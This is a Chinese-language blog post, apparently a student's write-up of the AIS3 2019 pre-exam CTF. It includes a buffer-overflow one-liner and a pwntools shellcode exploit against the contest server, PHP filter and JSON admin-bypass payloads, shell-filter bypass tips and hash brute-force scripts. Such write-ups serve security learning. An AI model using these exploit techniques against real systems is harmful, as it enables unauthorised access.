@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.chesskuo.tw","root":"/","scheme":"Gemini","version":"8.0.0-rc.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":false,"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="終於放暑假了，這學期真D忙爆到現在才有空寫writeup是說今年暑假行程也滿檔… 駕訓班, 研習營, AIS3…樣樣來真…真爽">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 2019 Pre-Exam Writeups">
+<meta property="og:url" content="https://blog.chesskuo.tw/post/20190621-AIS3-2019-Pre-Exam-Wirteup/index.html">
+<meta property="og:site_name" content="Chess.blog">
+<meta property="og:description" content="終於放暑假了，這學期真D忙爆到現在才有空寫writeup是說今年暑假行程也滿檔… 駕訓班, 研習營, AIS3…樣樣來真…真爽">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-06-21T06:43:49.000Z">
+<meta property="article:modified_time" content="2020-06-18T03:19:08.085Z">
+<meta property="article:author" content="Chess Kuo">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.chesskuo.tw/post/20190621-AIS3-2019-Pre-Exam-Wirteup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>AIS3 2019 Pre-Exam Writeups | Chess.blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chess.blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.chesskuo.tw/post/20190621-AIS3-2019-Pre-Exam-Wirteup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Chess Kuo">
+      <meta itemprop="description" content="與其擔心被批評，</br>不如想辦法被敬佩。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chess.blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AIS3 2019 Pre-Exam Writeups
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-06-21 14:43:49" itemprop="dateCreated datePublished" datetime="2019-06-21T14:43:49+08:00">2019-06-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-06-18 11:19:08" itemprop="dateModified" datetime="2020-06-18T11:19:08+08:00">2020-06-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>終於放暑假了，這學期真D忙爆<br>到現在才有空寫writeup<br>是說今年暑假行程也滿檔… 駕訓班, 研習營, AIS3…樣樣來<br>真…真爽</p>
+<a id="more"></a>
+
+<p>上次AIS3時才剛學資安不到半年，分數慘不忍睹菜到只剩備取尾巴<br>一年後的今天一口氣爬上了8X名，真的非常感謝學長這一年中的教導，雖然還是菜到廢 (我有個學弟好強R QQ)<br>希望明年能擠進50，希望有天也能變大佬 (X</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome-BOF"><a href="#Welcome-BOF" class="headerlink" title="Welcome BOF"></a>Welcome BOF</h2><p>注意！！！這是 x64系統<br>逆向看到輸入的變數會放在 <code>RBP-30h</code> 的位置<br>然後會發現有個沒用到的function call 了<code>system(&quot;sh&quot;)</code>在<code>0x40068B</code><br>由於是x64系統每個stack格子就變成 <code>8 byte了</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">"from pwn import *; print 'a'*0x38 + p64(0x400687);"</span>;cat -) | nc pre-exam-pwn.ais3.org 10000</span><br></pre></td></tr></table></figure>
+
+<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>第一次看到這種題目，稍微花了時間去研究seccomp<br>總之就是一種黑名單白名單的東西<br>而這題限制了只能用<code>open</code>, <code>read</code>, <code>write</code>的syscall</p>
+<p>由於沒開PIE，所以addr並不會變動輸入的東西都放在<code>0x6010A0</code><br>先把shellcode寫進去<br>然後最後直接bof到剛剛寫shellcode的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.pushstr(<span class="string">'/home/orw/flag'</span>)</span><br><span class="line">shellcode += shellcraft.open(<span class="string">'rsp'</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pre-exam-pwn.ais3.org'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'I give you bof, you know what to do :)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.sendline(0x24*'a' + '\x98\x08\x40\x00\x00\x00\x00\x00')</span></span><br><span class="line">r.sendline(<span class="number">0x20</span>*<span class="string">'a'</span> + <span class="string">'\xa0\x10\x60\x00\x00\x00\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Trivial"><a href="#Trivial" class="headerlink" title="Trivial"></a>Trivial</h2><p>有個function有一堆數字 (相信我你一看就會知道是哪個function)<br>全轉char就會看到flag了</p>
+<h2 id="TsaiBro"><a href="#TsaiBro" class="headerlink" title="TsaiBro"></a>TsaiBro</h2><p>逆向看code邏輯應該是每個字都會被處理成一段字串<br>把檔案丟進linux生出<code>A-Za-z{}_</code>的字典檔<br>開始推flag</p>
+<h2 id="HolyGrenade"><a href="#HolyGrenade" class="headerlink" title="HolyGrenade"></a>HolyGrenade</h2><p>把pyc丟去python的逆向，網上搜一搜很多<br>發現flag是每四個字為一組去加密的<br>所以 爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OO0o</span><span class="params">(arg)</span>:</span></span><br><span class="line">    arg = bytearray(arg, <span class="string">'ascii'</span>)</span><br><span class="line">    <span class="keyword">for</span> Oo0Ooo <span class="keyword">in</span> range(<span class="number">0</span>, len(arg), <span class="number">4</span>):</span><br><span class="line">        O0O0OO0O0O0 = arg[Oo0Ooo]</span><br><span class="line">        iiiii = arg[(Oo0Ooo + <span class="number">1</span>)]</span><br><span class="line">        ooo0OO = arg[(Oo0Ooo + <span class="number">2</span>)]</span><br><span class="line">        II1 = arg[(Oo0Ooo + <span class="number">3</span>)]</span><br><span class="line">        arg[Oo0Ooo + <span class="number">2</span>] = II1</span><br><span class="line">        arg[Oo0Ooo + <span class="number">1</span>] = O0O0OO0O0O0</span><br><span class="line">        arg[Oo0Ooo + <span class="number">3</span>] = iiiii</span><br><span class="line">        arg[Oo0Ooo] = ooo0OO</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arg.decode(<span class="string">'ascii'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag += '0' * (len(flag) % 4)</span></span><br><span class="line"><span class="comment"># for Oo0Ooo in range(0, len(flag), 4):</span></span><br><span class="line"><span class="comment">#     print(OO0o(md5(bytes(flag[Oo0Ooo:Oo0Ooo + 4])).hexdigest()))</span></span><br><span class="line"></span><br><span class="line">goal = [<span class="string">'ba3a7f3bd92a5d418f5e16886db62674'</span>,</span><br><span class="line">        <span class="string">'33e4500b205b80e52dd52e796cba8b7d'</span>,</span><br><span class="line">        <span class="string">'7d1c09bbf2025facf6bd0fec0ec6a780'</span>,</span><br><span class="line">        <span class="string">'9cedd8dee7b5b87838d7a9bed76df8e5'</span>,</span><br><span class="line">        <span class="string">'764d30cb4807c5a870a47b53be6cf662'</span>,</span><br><span class="line">        <span class="string">'f1e8fda6c3ff87e43905ea1690624c64'</span>,</span><br><span class="line">        <span class="string">'d7939cb11edaa9b1fb05efb4e2946f75'</span>,</span><br><span class="line">        <span class="string">'5ae001ebd955475c867617bdb72e7728'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(input)</span>:</span></span><br><span class="line">    words = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;_'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(words)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(words)):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(len(words)):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> range(len(words)):</span><br><span class="line">                    flag = words[i] + words[j] + words[k] + words[l]</span><br><span class="line">                    <span class="keyword">if</span> OO0o(md5(bytes(flag[<span class="number">0</span>:<span class="number">4</span>].encode(<span class="string">'ascii'</span>))).hexdigest()) == input:</span><br><span class="line">                        print(flag)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(goal)):</span><br><span class="line">    main(goal[i])</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SimpleWindow"><a href="#SimpleWindow" class="headerlink" title="SimpleWindow"></a>SimpleWindow</h2><p>清快取後flag在cookie中</p>
+<h2 id="Hidden"><a href="#Hidden" class="headerlink" title="Hidden"></a>Hidden</h2><p>這題超傻眼，看著一堆人解出來沒想過自己卡在這種莫名其妙的地方…<br>都找到了flag在哪算 卻不會執行QQ</p>
+<p>關鍵在<code>#3133</code> 的 <code>var r = function(){};</code><br>丟到console之後用 <code>r()</code> 來執行;</p>
+<h2 id="d1v1n6"><a href="#d1v1n6" class="headerlink" title="d1v1n6"></a>d1v1n6</h2><p>原本用<code>base64</code>會無法顯示完整<code>index.php</code>，因為字數限制1000<br>改用<code>?path=php://filter/read=string.rot13</code>可以噴出完整code<br>但發現根本沒差幾行</p>
+<p>發現要用<code>127.0.0.1</code>才能看到flag位置，因為是用<code>SERVER[&#39;REMOTE_ADDR&#39;]</code><br>所以<code>X-Forwarded</code>那招沒用</p>
+<p>php偽協議好ㄘ，雖然用<code>localhost</code>也不是預期解，因為官方說regex沒寫好才導致<code>localhost</code>可以用的…<br><code>?path=php://filter/read=convert.base64-encode/resource=http://localhost</code></p>
+<hr>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>簽到題<br><code>echo -n &#39;Welcom to AIS3 pre-exam in 2019!&#39; | md5sum</code><br>這段丟去執行出來然後包起來就是flag了</p>
+<h2 id="KcufsJ"><a href="#KcufsJ" class="headerlink" title="KcufsJ"></a>KcufsJ</h2><p>根據標題提示是反轉的JsFuck<br>執行後會出現在F12的console中</p>
+<h2 id="Are-you-admin"><a href="#Are-you-admin" class="headerlink" title="Are you admin?"></a>Are you admin?</h2><p>將中間的<code>&quot;is_admin&quot;:&quot;no&quot;</code>用另一個object包起來<br>然後自己構造<code>&quot;is_admin&quot;:&quot;yes&quot;</code>來通過驗證</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;aaa&quot;,&quot;is_admin&quot;:&quot;yes&quot;,&quot;obj&quot;:&#123;&quot;aaa&quot;:&quot;a&quot;,&quot;is_admin&quot;:&quot;no&quot;, &quot;age&quot;:&quot;12&quot;&#125;,&quot;0&quot;:&quot;0&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其實這不是預期解QQ 後來看官方解才知道原來ruby的json可以有註解</p>
+<h2 id="Pysh"><a href="#Pysh" class="headerlink" title="Pysh"></a>Pysh</h2><p>一樣很傻眼，找到了<code>read</code>可以用但沒乖乖把文件看完想說先放著<br>放著放著 就忘了…</p>
+<p>這題就是在過濾的字中找可以用的指令<br>很多種 像上面說到的<code>read $s;$s</code><br>或是linux系統中的預設環境變數<code>$BASH</code>, <code>$SHELL</code> (這兩個很屌 看官方解才學到的QQ)</p>
+<h2 id="Crystal-Maze"><a href="#Crystal-Maze" class="headerlink" title="Crystal Maze"></a>Crystal Maze</h2><p>對不起，我手走迷宮還用Excel畫地圖…</p>
+<hr>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="TCash"><a href="#TCash" class="headerlink" title="TCash"></a>TCash</h2><p>單純爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha256</span><br><span class="line"></span><br><span class="line">md5s =    [<span class="number">41</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">51</span>,  <span class="number">6</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">29</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">17</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">46</span>, <span class="number">50</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">33</span>,  <span class="number">1</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">17</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">27</span>,  <span class="number">1</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">52</span>, <span class="number">33</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">41</span>, <span class="number">31</span>, <span class="number">53</span>, <span class="number">26</span>, <span class="number">21</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">39</span>, <span class="number">51</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">39</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">53</span>, <span class="number">31</span>,  <span class="number">3</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">51</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">41</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">38</span>,  <span class="number">8</span>, <span class="number">50</span>, <span class="number">29</span>, <span class="number">15</span>]</span><br><span class="line">sha256s = [<span class="number">61</span>, <span class="number">44</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">30</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">58</span>, <span class="number">30</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">46</span>,  <span class="number">3</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">40</span>,  <span class="number">9</span>, <span class="number">59</span>, <span class="number">23</span>, <span class="number">36</span>, <span class="number">40</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">42</span>, <span class="number">33</span>, <span class="number">24</span>, <span class="number">36</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">39</span>,  <span class="number">9</span>, <span class="number">42</span>,  <span class="number">3</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">24</span>, <span class="number">40</span>,  <span class="number">3</span>, <span class="number">61</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">40</span>,  <span class="number">9</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">57</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">41</span>, <span class="number">11</span>,  <span class="number">9</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">40</span>,  <span class="number">3</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">44</span>,  <span class="number">9</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">42</span>,  <span class="number">3</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">13</span>, <span class="number">61</span>, <span class="number">40</span>,  <span class="number">3</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">19</span>, <span class="number">18</span>,  <span class="number">6</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">18</span>,  <span class="number">6</span>, <span class="number">22</span>,  <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">57</span>,  <span class="number">3</span>, <span class="number">40</span>, <span class="number">17</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">58</span>,  <span class="number">9</span>, <span class="number">40</span>, <span class="number">59</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">61</span>, <span class="number">58</span>,  <span class="number">9</span>, <span class="number">40</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">53</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line">cand = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cand :</span><br><span class="line">        tmp = int(md5(i.encode()).hexdigest(),<span class="number">16</span>)%<span class="number">64</span></span><br><span class="line">        tmp2 = int(sha256(i.encode()).hexdigest(),<span class="number">16</span>)%<span class="number">64</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tmp == md5s[index] <span class="keyword">and</span> tmp2 == sha256s[index] :</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> index == len(md5s):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/20190225-%E5%A5%BD%E6%AD%8C%E6%8E%A8%E8%96%A6-%E6%B0%97%E3%81%BE%E3%81%BE%E3%81%AA%E5%A4%A9%E4%BD%BF%E3%81%9F%E3%81%A1%EF%BC%8F%E3%82%8F%E3%81%9F%E3%81%A6%E3%82%93%E2%98%86%EF%BC%95/" rel="prev" title="好歌推薦 気ままな天使たち／わたてん☆５">
+      <i class="fa fa-chevron-left"></i> 好歌推薦 気ままな天使たち／わたてん☆５
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/20190804-AIS3-2019-%E6%96%B0%E7%AB%B9%E4%B8%80%E9%80%B1%E9%81%8A/" rel="next" title="AIS3-2019 新竹一週遊(?">
+      AIS3-2019 新竹一週遊(? <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
